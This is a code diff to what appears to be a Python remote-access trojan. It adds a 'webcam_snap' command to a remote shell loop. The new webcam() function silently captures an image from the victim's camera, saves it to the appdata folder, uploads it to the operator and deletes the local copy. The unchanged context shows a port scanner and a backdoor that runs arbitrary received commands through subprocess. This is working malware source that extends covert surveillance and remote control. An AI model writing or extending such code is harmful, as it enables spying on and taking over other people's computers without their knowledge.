@@ -28,6 +28,19 @@ import psutil
 import urllib.request as urllib2
 import platform
 import struct
+def webcam():
+    camera = VideoCapture(0)
+    while True:
+        return_value, image = camera.read()
+        imwrite(appd+'\\jarbou3.jpg', image)
+        size = os.path.getsize(appd+'\\jarbou3.jpg')
+
+        if size == 5432:
+            continue
+        else:
+            upload_file(appd+'\\jarbou3.jpg')
+            os.remove(appd+'\\jarbou3.jpg')
+            break
 def scanport(ip,port):
 
     scan = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -819,6 +832,8 @@ def shell():
                 except:
                     reliable_send('[-]error')
                     continue
+            elif command[:11] == "webcam_snap":
+                webcam()
             else:
                 execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                            stdin=subprocess.PIPE)
